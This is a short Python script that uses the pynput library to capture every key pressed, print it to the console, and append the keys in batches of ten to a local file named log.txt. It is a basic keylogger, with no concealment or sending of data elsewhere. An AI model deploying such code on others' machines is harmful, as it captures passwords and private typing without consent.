import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []
def on_press(key):
    global count, keys

    print(f"{key} is Pressed")
    keys.append(str(key))
    count = count + 1
    if count == 10:
        count = 0
        k1 = ' '.join(keys)
        with open('log.txt', 'a') as f:
            f.write(str(k1))
            f.write('\n')

        keys = []

def on_release(key):
    pass

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
